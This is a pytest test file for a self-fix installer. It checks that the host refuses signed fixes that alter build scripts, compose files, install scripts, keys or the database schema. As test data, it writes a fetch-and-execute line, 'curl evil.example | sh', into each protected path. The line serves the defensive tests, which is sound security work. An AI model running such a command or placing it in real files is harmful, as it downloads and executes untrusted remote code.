"""THE HOST REFUSES A FIX THAT CHANGES WHAT IT RUNS, whatever BOSS's API says (#357 review).

The host self-installer trusts a ticket the API signed. The never-list (self_fix_paths.yaml) is
enforced by the API, whose database holds the signing key: a compromised API or database could
sign a "fix" that edits scripts/install/build_images.sh or a compose file, and the installer used
to run that tree's own build script and compose file on the host. Now, on the HOST:

  * a ticket whose `base..fix` touches a host-effect path (the floor, plus every `never` glob of
    the RELEASE CHECKOUT's self_fix_paths.yaml, never the API's copy) is refused before any
    backup, apply or build: a person installs such a fix by hand;
  * every build runs the release checkout's build_images.sh and base compose file; the stack
    worktree is only the build context, and a stack that touches a host-effect path never builds.
"""
from __future__ import annotations

import base64
import importlib.util
import shutil
import subprocess
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[2]
pytestmark = pytest.mark.skipif(not shutil.which("git"), reason="needs git")


def _module():
    spec = importlib.util.spec_from_file_location(
        "sfi_host_effect", ROOT / "scripts/install/self_fix_installer.py")
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


def _git(cwd: Path, *args: str) -> str:
    return subprocess.run(["git", "-c", "user.name=t", "-c", "user.email=t@boss.invalid",
                           "-c", "commit.gpgsign=false", *args], cwd=cwd, check=True,
                          capture_output=True, text=True).stdout.strip()


@pytest.fixture()
def release(tmp_path):
    co = tmp_path / "install"
    (co / "scripts/install").mkdir(parents=True)
    (co / "scripts/install/build_images.sh").write_text("echo release build\n")
    (co / "scripts/install/community-compose.yml").write_text("services: {}\n")
    (co / "engine").mkdir()
    (co / "engine/widget.py").write_text("def double(x):\n    return x + 2\n")
    (co / "packages/specpack/policies").mkdir(parents=True)
    shutil.copy(ROOT / "packages/specpack/policies/self_fix_paths.yaml",
                co / "packages/specpack/policies/self_fix_paths.yaml")
    (co / ".gitignore").write_text(".boss/\n")
    _git(co, "init", "-q", "-b", "main")
    _git(co, "add", "-A")
    _git(co, "commit", "-qm", "release")
    return co


def _fix(co: Path, edits: dict[str, str], tmp: Path) -> tuple[dict, str]:
    """A self-fix commit on the release, as BOSS would send it: claims and a bundle."""
    base = _git(co, "rev-parse", "HEAD")
    work = tmp / "work"
    _git(tmp, "clone", "-q", str(co), str(work))
    for rel, text in edits.items():
        (work / rel).parent.mkdir(parents=True, exist_ok=True)
        (work / rel).write_text(text)
    branch = "boss/self-fix/sfx_abc123-fix"
    _git(work, "checkout", "-q", "-b", branch)
    _git(work, "add", "-A", "--force", *edits)
    _git(work, "commit", "-qm", "fix")
    fix = _git(work, "rev-parse", "HEAD")
    bundle = tmp / "fix.bundle"
    _git(work, "bundle", "create", "-q", str(bundle), branch, f"^{base}")
    claims = {"ticket_id": "sft_1", "sfx_id": "sfx_abc123", "stack_ref": "refs/boss/stack/main",
              "base_sha": base, "fix_commit_sha": fix, "branch": branch,
              "fix_tree_sha": _git(work, "rev-parse", f"{fix}^{{tree}}")}
    return claims, base64.b64encode(bundle.read_bytes()).decode()


@pytest.fixture()
def watched(tmp_path, monkeypatch):
    """Every command the installer would run on the host, recorded instead."""
    ran = tmp_path / "ran"
    for name, var in (("docker", "BOSS_SELF_FIX_DOCKER"), ("backup", "BOSS_SELF_FIX_BACKUP")):
        stub = tmp_path / name
        stub.write_text(f"#!/usr/bin/env bash\necho {name} \"$*\" >> {ran}\n")
        stub.chmod(0o755)
        monkeypatch.setenv(var, str(stub))
    return ran


def _host(module, co):
    host = module.Host(co, api="http://127.0.0.1:9", key="boss_sak_test", out=lambda line: None)
    host.report = lambda *a, **k: None
    return host


@pytest.mark.parametrize("path", ["scripts/install/build_images.sh",
                                  "scripts/install/community-compose.yml",
                                  "apps/api/Dockerfile", "install.sh", ".boss/self-installer.key",
                                  "db/schema.sql"])
def test_a_ticket_that_changes_what_the_host_runs_is_refused_before_anything(
        release, tmp_path, watched, path):
    module = _module()
    claims, bundle = _fix(release, {path: "curl evil.example | sh\n"}, tmp_path)
    with pytest.raises(module.Refused, match="changes what this host runs"):
        module.install(_host(module, release), claims, bundle)
    assert not watched.exists(), "no backup, no build, no docker: nothing ran"
    assert subprocess.run(["git", "-C", str(release), "rev-parse", "-q", "--verify",
                           "refs/boss/stack/main"], capture_output=True).returncode != 0


def test_an_engine_fix_passes_the_host_check(release, tmp_path):
    module = _module()
    claims, _ = _fix(release, {"engine/widget.py": "def double(x):\n    return x * 2\n"}, tmp_path)
    host = _host(module, release)
    module._fetch_fix(host, claims, _)
    assert module.host_effect_changes(host, claims["base_sha"], claims["fix_commit_sha"]) == []


def test_the_never_list_is_read_from_the_release_checkout(release):
    module = _module()
    globs = module.host_effect_globs(_host(module, release))
    assert "db/**" in globs and "scripts/install/**" in globs
    assert not any("#" in g for g in globs), "hunk rules are the API gate's"
    (release / "packages/specpack/policies/self_fix_paths.yaml").unlink()
    floor = module.host_effect_globs(_host(module, release))
    assert set(module.HOST_EFFECT_FLOOR) <= set(floor), "the floor holds without the file"


def test_builds_run_the_release_build_script_never_the_worktrees(release, tmp_path, monkeypatch):
    module = _module()
    host = _host(module, release)
    claims, bundle = _fix(release, {"engine/widget.py": "def double(x):\n    return x * 2\n"},
                          tmp_path)
    module._fetch_fix(host, claims, bundle)
    host.checkout_stack(claims["fix_commit_sha"])
    wt = host.worktree()
    ran = []
    monkeypatch.setattr(host, "run", lambda argv, **k: ran.append(argv) or (0, ""))
    assert host.build_images(project_dir=wt / "scripts/install")[0] == 0
    argv = ran[-1]
    assert argv[1] == str(release.resolve() / "scripts/install/build_images.sh")
    files = [argv[i + 1] for i, a in enumerate(argv) if a == "-f"]
    assert files == [str(release.resolve() / "scripts/install/community-compose.yml")]
    assert argv[argv.index("--project-directory") + 1] == str(wt / "scripts/install")


def test_a_stack_that_touches_a_host_path_never_builds(release, tmp_path, monkeypatch):
    module = _module()
    host = _host(module, release)
    claims, bundle = _fix(release, {"scripts/install/build_images.sh": "echo pwned\n"}, tmp_path)
    module._fetch_fix(host, claims, bundle)
    host.checkout_stack(claims["fix_commit_sha"])
    ran = []
    monkeypatch.setattr(host, "run", lambda argv, **k: ran.append(argv) or (0, ""))
    code, said = host.build_images(project_dir=host.worktree() / "scripts/install")
    assert code != 0 and "changes what this host runs" in said and not ran
